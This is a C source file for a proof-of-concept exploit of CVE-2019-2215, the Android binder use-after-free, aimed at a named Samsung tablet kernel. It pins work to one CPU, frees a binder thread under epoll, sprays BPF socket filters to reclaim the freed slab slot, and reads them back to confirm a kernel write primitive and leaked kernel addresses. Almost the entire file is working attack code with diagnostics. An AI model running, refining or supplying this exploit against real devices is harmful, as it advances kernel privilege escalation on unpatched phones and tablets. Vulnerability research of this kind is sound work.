/*
 * cve_2019_2215_pin.c — CVE-2019-2215 with CPU pinning + in-process detection
 *
 * KEY FIXES from previous attempts:
 * 1. BC_TRANSACTION to set transaction_stack → binder_poll uses thread->wait
 * 2. CPU affinity to pin ALL operations to CPU 0 (SLUB per-CPU pages!)
 * 3. NO forking for detection — SO_GET_FILTER in same process
 * 4. Extra large spray (500) to exhaust CPU-local partial pages
 * 5. Detailed slab monitoring at each step
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o cve_2019_2215_pin cve_2019_2215_pin.c -lpthread
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int32_t)
#define BINDER_MMAP_SIZE        (128 * 1024)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

struct binder_transaction_data {
    union { uint32_t handle; void *ptr; } target;
    void *cookie;
    uint32_t code;
    uint32_t flags;
    int32_t sender_pid;
    uint32_t sender_euid;
    uint32_t data_size;
    uint32_t offsets_size;
    union {
        struct { const void *buffer; const void *offsets; } ptr;
        uint8_t buf8[8];
    } data;
};

#define BC_TRANSACTION  0x40286300
#define BC_ENTER_LOOPER 0x0000630C

#define NUM_SPRAY 500
#define BPF_INSNS 26

static int get_slab(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512]; int val = -1;
    while (fgets(line, sizeof(line), f)) {
        char n[64]; int a;
        if (sscanf(line, "%63s %d", n, &a) == 2 && !strcmp(n, name))
            { val = a; break; }
    }
    fclose(f);
    return val;
}

static void pin_cpu(int cpu) {
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(cpu, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
}

/* ========== TEST 1: Step-by-step diagnostic with slab tracking ========== */

static void test_diagnostic(void) {
    printf("=== TEST 1: Step-by-step diagnostic ===\n");
    pin_cpu(0);

    int k256_base = get_slab("kmalloc-256");
    printf("  [0] Base k256: %d\n", k256_base);

    /* Step 1: Open binder */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (bfd < 0) { printf("  binder open failed: %s\n", strerror(errno)); return; }
    mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
    uint32_t z = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

    int k256_after_open = get_slab("kmalloc-256");
    printf("  [1] After binder open: k256=%d (delta=%+d, binder_thread created)\n",
           k256_after_open, k256_after_open - k256_base);

    /* Step 2: BC_ENTER_LOOPER */
    uint32_t looper_cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr_looper = {
        .write_size = sizeof(looper_cmd),
        .write_consumed = 0,
        .write_buffer = (unsigned long)&looper_cmd,
        .read_size = 0, .read_consumed = 0, .read_buffer = 0,
    };
    int rc = ioctl(bfd, BINDER_WRITE_READ, &bwr_looper);
    printf("  [2] BC_ENTER_LOOPER: rc=%d (%s)\n", rc,
           rc < 0 ? strerror(errno) : "OK");

    /* Step 3: BC_TRANSACTION to handle 0 */
    char txn_data[4] = { 0 };
    struct binder_transaction_data txn;
    memset(&txn, 0, sizeof(txn));
    txn.target.handle = 0;
    txn.code = 1;
    txn.flags = 0;
    txn.data_size = sizeof(txn_data);
    txn.offsets_size = 0;
    txn.data.ptr.buffer = (void *)txn_data;
    txn.data.ptr.offsets = NULL;

    uint32_t txn_cmd = BC_TRANSACTION;
    unsigned char write_buf[sizeof(txn_cmd) + sizeof(txn)];
    memcpy(write_buf, &txn_cmd, sizeof(txn_cmd));
    memcpy(write_buf + sizeof(txn_cmd), &txn, sizeof(txn));

    struct binder_write_read bwr_txn = {
        .write_size = sizeof(write_buf),
        .write_consumed = 0,
        .write_buffer = (unsigned long)write_buf,
        .read_size = 0, .read_consumed = 0, .read_buffer = 0,
    };
    rc = ioctl(bfd, BINDER_WRITE_READ, &bwr_txn);
    printf("  [3] BC_TRANSACTION: rc=%d (%s) consumed=%ld/%ld\n",
           rc, rc < 0 ? strerror(errno) : "OK",
           bwr_txn.write_consumed, bwr_txn.write_size);

    /* Step 4: epoll_ctl ADD */
    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    rc = epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
    printf("  [4] epoll_ctl ADD: rc=%d (%s)\n", rc,
           rc < 0 ? strerror(errno) : "OK");

    int k256_before_free = get_slab("kmalloc-256");
    printf("       k256 before free: %d (delta=%+d from base)\n",
           k256_before_free, k256_before_free - k256_base);

    /* Step 5: BINDER_THREAD_EXIT (UAF!) */
    int32_t dummy = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

    int k256_after_free = get_slab("kmalloc-256");
    printf("  [5] THREAD_EXIT: k256=%d (delta=%+d from before = %d freed)\n",
           k256_after_free, k256_after_free - k256_before_free,
           k256_before_free - k256_after_free);

    /* Step 6: BPF spray with ALL-ZERO instructions */
    struct sock_filter zero_insns[BPF_INSNS];
    for (int i = 0; i < BPF_INSNS - 1; i++)
        zero_insns[i] = (struct sock_filter){ 0x0000, 0, 0, 0x00000000 };
    zero_insns[BPF_INSNS - 1] = (struct sock_filter){ BPF_RET | BPF_K, 0, 0, 0xFFFF };

    struct sock_fprog prog = { .len = BPF_INSNS, .filter = zero_insns };
    int spray_socks[NUM_SPRAY];
    int sprayed = 0;
    for (int i = 0; i < NUM_SPRAY; i++) {
        spray_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (spray_socks[i] < 0) { printf("  socket failed at %d: %s\n", i, strerror(errno)); break; }
        if (setsockopt(spray_socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                      &prog, sizeof(prog)) < 0) {
            close(spray_socks[i]);
            printf("  attach failed at %d: %s\n", i, strerror(errno));
            break;
        }
        sprayed++;
    }

    int k256_after_spray = get_slab("kmalloc-256");
    printf("  [6] Sprayed %d BPF: k256=%d (delta=%+d from after_free)\n",
           sprayed, k256_after_spray, k256_after_spray - k256_after_free);

    /* Step 7: TRIGGER — close(epfd)
     * ep_unregister_pollwait → remove_wait_queue(freed_thread->wait)
     * spin_lock on BPF data (=0 → unlocked)
     * list_del writes eppoll_entry address into BPF data at wait_queue_head offset */
    printf("  [7] Triggering close(epfd)...\n");
    close(epfd);
    printf("       close(epfd) completed (no hang!)\n");

    /* Step 8: SO_GET_FILTER readback — scan ALL instructions for corruption */
    printf("  [8] Scanning %d BPF filters for corruption...\n", sprayed);
    int total_corrupted = 0;
    int corrupted_sock = -1;
    for (int i = 0; i < sprayed; i++) {
        struct sock_filter rb[BPF_INSNS];
        socklen_t optlen = sizeof(rb);
        if (getsockopt(spray_socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                      rb, &optlen) < 0) {
            if (i < 3) printf("       getsockopt sock %d failed: %s\n", i, strerror(errno));
            continue;
        }

        for (int j = 0; j < BPF_INSNS - 1; j++) {
            uint32_t *raw = (uint32_t *)&rb[j];
            if (raw[0] != 0 || raw[1] != 0) {
                int byte_off = 20 + j * 8;
                printf("  *** CORRUPTION sock %d insn[%d] (alloc_off=%d): "
                       "%08x %08x ***\n", i, j, byte_off, raw[0], raw[1]);
                if ((raw[0] >= 0xC0000000 && raw[0] < 0xF0000000))
                    printf("      → KERNEL ADDRESS: 0x%08x\n", raw[0]);
                if ((raw[1] >= 0xC0000000 && raw[1] < 0xF0000000))
                    printf("      → KERNEL ADDRESS: 0x%08x\n", raw[1]);
                total_corrupted++;
                corrupted_sock = i;
            }
        }
    }

    printf("  Result: %d corrupted instructions across %d sockets\n",
           total_corrupted, sprayed);

    if (total_corrupted > 0) {
        printf("\n  *** CVE-2019-2215 UAF WRITE PRIMITIVE CONFIRMED! ***\n");
        printf("  *** Kernel address leaked into BPF filter data! ***\n\n");
    } else {
        printf("  No corruption detected. Possible reasons:\n");
        printf("    - SLUB didn't reuse freed slot (unlikely with %d sprays)\n", sprayed);
        printf("    - binder_poll used proc->wait (transaction may have failed)\n");
        printf("    - wait_queue_head offset differs from expected\n");
    }

    /* Step 9: Check also header fields (refcnt, len, bpf_func) */
    printf("\n  [9] Checking for header corruption (refcnt/len/bpf_func)...\n");
    /* If corruption hit the header instead of instructions, SO_GET_FILTER
     * might fail or return wrong instruction count */
    int get_failures = 0;
    int wrong_len = 0;
    for (int i = 0; i < sprayed; i++) {
        struct sock_filter rb[BPF_INSNS + 10]; /* Extra space */
        socklen_t optlen = sizeof(rb);
        int rc = getsockopt(spray_socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                           rb, &optlen);
        if (rc < 0) { get_failures++; continue; }
        if (optlen != BPF_INSNS) { wrong_len++; }
    }
    printf("  get_failures=%d wrong_len=%d (out of %d)\n",
           get_failures, wrong_len, sprayed);

    /* Cleanup */
    for (int i = 0; i < sprayed; i++) close(spray_socks[i]);
    close(bfd);
    printf("\n");
}

/* ========== TEST 2: Multiple iterations with per-iteration CPU pin ========== */

static void test_multi_iter(void) {
    printf("=== TEST 2: Multi-iteration with crash detection ===\n\n");

    int crashes = 0, corruptions = 0;

    for (int trial = 0; trial < 50; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            pin_cpu(0); /* CRITICAL: pin to same CPU for SLUB locality */

            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            if (bfd < 0) _exit(1);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0;
            ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            /* Set transaction_stack */
            uint32_t looper_cmd = BC_ENTER_LOOPER;
            struct binder_write_read bwr1 = {
                .write_size = 4, .write_buffer = (unsigned long)&looper_cmd,
                .read_size = 0, .read_buffer = 0,
            };
            ioctl(bfd, BINDER_WRITE_READ, &bwr1);

            char txn_data[4] = {0};
            struct binder_transaction_data txn;
            memset(&txn, 0, sizeof(txn));
            txn.target.handle = 0; txn.code = 1;
            txn.data_size = 4; txn.data.ptr.buffer = txn_data;

            uint32_t txn_cmd = BC_TRANSACTION;
            unsigned char wb[sizeof(txn_cmd) + sizeof(txn)];
            memcpy(wb, &txn_cmd, sizeof(txn_cmd));
            memcpy(wb + sizeof(txn_cmd), &txn, sizeof(txn));
            struct binder_write_read bwr2 = {
                .write_size = sizeof(wb), .write_buffer = (unsigned long)wb,
                .read_size = 0, .read_buffer = 0,
            };
            ioctl(bfd, BINDER_WRITE_READ, &bwr2);

            /* epoll on binder (now should be thread->wait) */
            int epfd = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

            /* UAF */
            int32_t dummy = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

            /* Spray */
            struct sock_filter zi[BPF_INSNS];
            for (int i = 0; i < BPF_INSNS - 1; i++)
                zi[i] = (struct sock_filter){ 0, 0, 0, 0 };
            zi[BPF_INSNS - 1] = (struct sock_filter){ BPF_RET | BPF_K, 0, 0, 0xFFFF };
            struct sock_fprog prog = { .len = BPF_INSNS, .filter = zi };

            int socks[NUM_SPRAY];
            int sprayed = 0;
            for (int i = 0; i < NUM_SPRAY; i++) {
                socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
                if (socks[i] >= 0 &&
                    setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                              &prog, sizeof(prog)) == 0)
                    sprayed++;
                else { if (socks[i] >= 0) close(socks[i]); break; }
            }

            /* Trigger */
            close(epfd);

            /* Detect */
            int found = 0;
            for (int i = 0; i < sprayed; i++) {
                struct sock_filter rb[BPF_INSNS];
                socklen_t optlen = sizeof(rb);
                if (getsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                              rb, &optlen) < 0)
                    continue;
                for (int j = 0; j < BPF_INSNS - 1; j++) {
                    uint32_t *raw = (uint32_t *)&rb[j];
                    if (raw[0] != 0 || raw[1] != 0) {
                        found++;
                        if (found == 1)
                            printf("  [%d] CORRUPTION insn[%d] off=%d: %08x_%08x\n",
                                   trial, j, 20+j*8, raw[0], raw[1]);
                    }
                }
            }

            for (int i = 0; i < sprayed; i++) close(socks[i]);
            close(bfd);
            _exit(found > 0 ? 42 : 0);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            printf("  [%d] CRASH sig=%d\n", trial, WTERMSIG(status));
            crashes++;
        } else if (WIFEXITED(status) && WEXITSTATUS(status) == 42) {
            corruptions++;
        }

        if ((trial + 1) % 10 == 0)
            printf("  [%d/%d] crashes=%d corruptions=%d\n",
                   trial + 1, 50, crashes, corruptions);
    }

    printf("  TOTAL: crashes=%d corruptions=%d out of 50\n\n", crashes, corruptions);
    if (corruptions > 0 || crashes > 0) {
        printf("  *** UAF WRITE PRIMITIVE CONFIRMED! ***\n\n");
    }
}

/* ========== TEST 3: Alternative — use epoll_ctl DEL to trigger ========== */

static void test_epoll_del_trigger(void) {
    printf("=== TEST 3: epoll_ctl DEL trigger (vs close) ===\n");
    printf("  DEL removes the wait entry without destroying epoll\n\n");

    pin_cpu(0);

    for (int trial = 0; trial < 20; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            pin_cpu(0);

            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            if (bfd < 0) _exit(1);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0; ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            /* Transaction */
            uint32_t lc = BC_ENTER_LOOPER;
            struct binder_write_read bwr1 = { .write_size = 4, .write_buffer = (unsigned long)&lc };
            ioctl(bfd, BINDER_WRITE_READ, &bwr1);

            char td[4] = {0};
            struct binder_transaction_data txn = {0};
            txn.target.handle = 0; txn.code = 1;
            txn.data_size = 4; txn.data.ptr.buffer = td;
            uint32_t tc = BC_TRANSACTION;
            unsigned char wb[sizeof(tc) + sizeof(txn)];
            memcpy(wb, &tc, sizeof(tc));
            memcpy(wb + sizeof(tc), &txn, sizeof(txn));
            struct binder_write_read bwr2 = { .write_size = sizeof(wb), .write_buffer = (unsigned long)wb };
            ioctl(bfd, BINDER_WRITE_READ, &bwr2);

            int epfd = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

            int32_t dummy = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

            /* Spray */
            struct sock_filter zi[BPF_INSNS];
            for (int i = 0; i < BPF_INSNS - 1; i++)
                zi[i] = (struct sock_filter){ 0, 0, 0, 0 };
            zi[BPF_INSNS - 1] = (struct sock_filter){ BPF_RET | BPF_K, 0, 0, 0xFFFF };
            struct sock_fprog prog = { .len = BPF_INSNS, .filter = zi };

            int socks[NUM_SPRAY];
            int sprayed = 0;
            for (int i = 0; i < NUM_SPRAY; i++) {
                socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
                if (socks[i] >= 0 &&
                    setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                              &prog, sizeof(prog)) == 0)
                    sprayed++;
                else { if (socks[i] >= 0) close(socks[i]); break; }
            }

            /* Use DEL instead of close */
            epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, NULL);

            int found = 0;
            for (int i = 0; i < sprayed; i++) {
                struct sock_filter rb[BPF_INSNS];
                socklen_t optlen = sizeof(rb);
                if (getsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                              rb, &optlen) < 0)
                    continue;
                for (int j = 0; j < BPF_INSNS - 1; j++) {
                    uint32_t *raw = (uint32_t *)&rb[j];
                    if (raw[0] != 0 || raw[1] != 0) {
                        found++;
                        if (found == 1)
                            printf("  [%d] DEL CORRUPTION insn[%d]: %08x_%08x\n",
                                   trial, j, raw[0], raw[1]);
                    }
                }
            }

            for (int i = 0; i < sprayed; i++) close(socks[i]);
            close(epfd); close(bfd);
            _exit(found > 0 ? 42 : 0);
        }

        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            printf("  [%d] CRASH sig=%d\n", trial, WTERMSIG(status));
        else if (WIFEXITED(status) && WEXITSTATUS(status) == 42)
            printf("  [%d] CORRUPTION DETECTED!\n", trial);
    }
    printf("\n");
}

/* ========== TEST 4: No spray — raw UAF crash test ========== */

static void test_raw_uaf(void) {
    printf("=== TEST 4: Raw UAF without spray (crash test) ===\n");
    printf("  If binder_poll used thread->wait and SLUB poisons freed mem,\n");
    printf("  close(epfd) should hang or crash\n\n");

    for (int trial = 0; trial < 10; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            pin_cpu(0);

            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            if (bfd < 0) _exit(1);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0; ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            uint32_t lc = BC_ENTER_LOOPER;
            struct binder_write_read bwr1 = { .write_size = 4, .write_buffer = (unsigned long)&lc };
            ioctl(bfd, BINDER_WRITE_READ, &bwr1);

            char td[4] = {0};
            struct binder_transaction_data txn = {0};
            txn.target.handle = 0; txn.code = 1;
            txn.data_size = 4; txn.data.ptr.buffer = td;
            uint32_t tc = BC_TRANSACTION;
            unsigned char wb[sizeof(tc) + sizeof(txn)];
            memcpy(wb, &tc, sizeof(tc));
            memcpy(wb + sizeof(tc), &txn, sizeof(txn));
            struct binder_write_read bwr2 = { .write_size = sizeof(wb), .write_buffer = (unsigned long)wb };
            ioctl(bfd, BINDER_WRITE_READ, &bwr2);

            int epfd = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

            int32_t dummy = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

            /* NO SPRAY — freed memory has SLUB freelist pointer at offset 0
             * and original binder_thread data elsewhere */

            close(epfd); /* This accesses freed memory */

            close(bfd);
            _exit(0);
        }

        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            printf("  [%d] CRASH sig=%d — UAF confirmed! (thread->wait used)\n",
                   trial, WTERMSIG(status));
        } else if (WIFEXITED(status) && WEXITSTATUS(status) == 14) {
            printf("  [%d] TIMEOUT (alarm) — spin_lock HUNG on freed data!\n", trial);
        } else {
            printf("  [%d] clean — freed data still has valid lock=0\n", trial);
        }
    }

    printf("\n  If all clean: binder_poll likely used proc->wait (not UAF)\n");
    printf("  If hangs/crashes: binder_poll used thread->wait (UAF confirmed!)\n\n");
}

/* ========== TEST 5: Without BC_TRANSACTION baseline ========== */

static void test_no_txn_baseline(void) {
    printf("=== TEST 5: Baseline WITHOUT BC_TRANSACTION ===\n\n");

    for (int trial = 0; trial < 5; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            pin_cpu(0);

            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            if (bfd < 0) _exit(1);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0; ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            /* NO BC_TRANSACTION — epoll should use proc->wait */
            int epfd = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

            int32_t dummy = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

            close(epfd);
            close(bfd);
            _exit(0);
        }

        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            printf("  [%d] CRASH sig=%d\n", trial, WTERMSIG(status));
        else if (WIFEXITED(status) && WEXITSTATUS(status) == 14)
            printf("  [%d] TIMEOUT (alarm)\n", trial);
        else
            printf("  [%d] clean (proc->wait used, no UAF)\n", trial);
    }
    printf("\n");
}

int main(void) {
    printf("=== CVE-2019-2215 CPU-Pinned Exploit ===\n");
    printf("SM-T377A kernel 3.10.9, patch 2017-07\n");
    printf("PID=%d UID=%d\n\n", getpid(), getuid());

    alarm(600);

    test_no_txn_baseline();    /* Should all be clean */
    test_raw_uaf();            /* Should hang/crash if thread->wait used */
    test_diagnostic();         /* Detailed slab tracking */
    test_multi_iter();         /* 50 iterations with CPU pin */
    test_epoll_del_trigger();  /* DEL instead of close */

    printf("--- dmesg ---\n");
    fflush(stdout);
    system("dmesg 2>/dev/null | tail -30 | grep -iE "
           "'oops|bug|panic|fault|corrupt|Backtrace|Unable|PC.is|"
           "binder|epoll|WARNING|list_del|use.after|slab|freed' 2>/dev/null");

    printf("\n=== Done ===\n");
    return 0;
}
